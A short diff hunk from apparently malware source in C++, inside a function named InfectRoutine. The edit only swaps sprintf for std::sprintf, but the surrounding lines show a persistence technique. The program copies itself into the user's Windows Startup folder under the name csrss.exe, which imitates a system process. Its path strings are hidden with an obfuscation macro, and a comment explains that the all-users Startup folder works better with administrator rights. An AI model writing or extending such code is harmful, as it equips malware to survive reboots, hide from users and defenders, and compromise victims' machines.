@@ -83,7 +83,7 @@ void InfectRoutine()
 	constexpr auto permission = fs::perms::all;
 
 	try { // Note: "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\csrss.exe" works better, however, the file needs to be ran as administrator/has administrator privileges to be able to copy files into that directory.
-		sprintf(startup_path, AY_OBFUSCATE("%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\csrss.exe"), std::getenv(AY_OBFUSCATE("appdata")));
+		std::sprintf(startup_path, AY_OBFUSCATE("%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\csrss.exe"), std::getenv(AY_OBFUSCATE("appdata")));
 		if (current_module != startup_path) {
 			if (!fs::exists(startup_path)) {
 				fs::copy(current_module, startup_path);
